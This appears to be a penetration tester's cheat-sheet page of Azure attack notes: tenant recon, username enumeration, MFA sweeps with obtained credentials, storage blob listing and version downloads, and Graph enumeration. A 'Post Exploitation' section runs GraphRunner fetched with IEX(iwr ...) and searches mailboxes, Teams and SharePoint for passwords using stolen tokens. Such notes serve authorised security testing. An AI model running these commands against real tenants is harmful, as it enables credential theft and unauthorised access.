---
title: Azure Notes 
weight: 40
menu:
  notes:
    name: Azure Notes
    identifier: notes-cloud-azure-info
    parent: notes-cloud-azure
    weight: 20
---


{{< note title="Recon and Enumeration">}}

Get basic information about the domain
```
https://login.microsoftonline.com/getuserrealm.srf?login=example.com&xml=1
```


AAD Internals
```
Get-AADIntLoginInformation -Domain <example.com>
Get-AADIntTenantID -Domain <example.com>
Invoke-AADIntReconAsOutsider -DomainName <example.com>
https://aadinternals.com/osint/
```

Azure Subdomain Enumeration
```
Github https://github.com/yuyudhn/AzSubEnum
python3 azsubenum.py -b domain -p permutations.txt -v
```

Username Enumeration
```
Github: https://github.com/0xZDH/Omnispray
python3 omnispray.py -m o365_enum_office -d example.com -uf ~/Documents/userList.txt
```

Checking Azure MFA (Assuming Credentials are obtained)
```
Github: https://github.com/dafthack/MFASweep
Invoke-MFASweep -Username <Username> -Password <password> -Recon -IncludeADFS
```

Blob Enumeration
```
Format
https://<storageAccount>.blob.core.windows.net/<containername>/file.txt

//List Directories in Blob
https://<storageAccount>.blob.core.windows.net/<containername>?restype=container&comp=list&delimiter=%2F

//Check for Versioning in blob
curl -H "x-ms-version: 2019-12-12" 'https://<storageAccount>.blob.core.windows.net/<containername>?restype=container&comp=list&include=versions' | xmllint --format - | less

//Download Potential Files (assuming versioning is enabled)
curl -H "x-ms-version: 2019-12-12" 'https://<storageAccount>.blob.core.windows.net/<containername>/file.zip?versionId=<VersionID>' --output file.zip
``` 

Azure App Enumeration
```
<appName>.azurewebsites.net
<appName>.scm.azurewebsites.net
```


{{< /note >}}


{{< note title="Post Exploitation">}}

GraphRunner to enumerate Office Products 
```
IEX (iwr 'https://raw.githubusercontent.com/dafthack/GraphRunner/main/GraphRunner.ps1')
Invoke-SearchSharePointAndOneDrive -Tokens $tokens -SearchTerm 'password filetype:xlsx'
Invoke-SearchTeams -Tokens $tokens -SearchTerm password
Invoke-SearchMailbox -Tokens $tokens -SearchTerm "password" -MessageCount 50
```
{{< /note >}}


{{< note title="Az and Graph Powershell Modules">}}

Setup Az and Graph Powershell Modules 
```
az login

Install-Module Microsoft.Graph
Import-Module Microsoft.Graph
Connect-MgGraph
```

Az Cli Enumeration
```
az account list --output table
az resource list --output table 
```

Microsoft Graph Powershell Enumeration
```
#Get user Info
Get-MgUser -UserId <email> | fl
#Get AU Info
Get-MgDirectoryAdministrativeUnit | fl

#Get Roles associated with an AU
#Automation Script: https://github.com/BenTamam/PentestPlayground/blob/main/Azure/Scripts/CheckScopedRolePrivileges.ps1
$ScopedRoleMembers = Get-MgDirectoryAdministrativeUnitScopedRoleMember -AdministrativeUnitId <AU-ID>
Get-MgDirectoryRole -DirectoryRoleId <RoleID> | fl

#Find Users who are members of the Role
foreach ($member in $ScopedRoleMembers) {
    $userId = $member.RoleMemberInfo.Id
    
    if (-not $userId) {
        Write-Output "No user ID available for member with Role ID: $($member.RoleId)"
        continue
    }

    $userDetails = Get-MgUser -UserId $userId
    
    if ($userDetails) {
        Write-Output "User Details: Name - $($userDetails.DisplayName), Email - $($userDetails.Mail), Role ID - $($member.RoleId)"
    } else {
        Write-Output "Failed to retrieve details for user ID: $userId"
    }
}

#Checking Members of the AU
Get-MgDirectoryAdministrativeUnitMember -AdministrativeUnitId <AU-ID>
```


{{< /note >}}

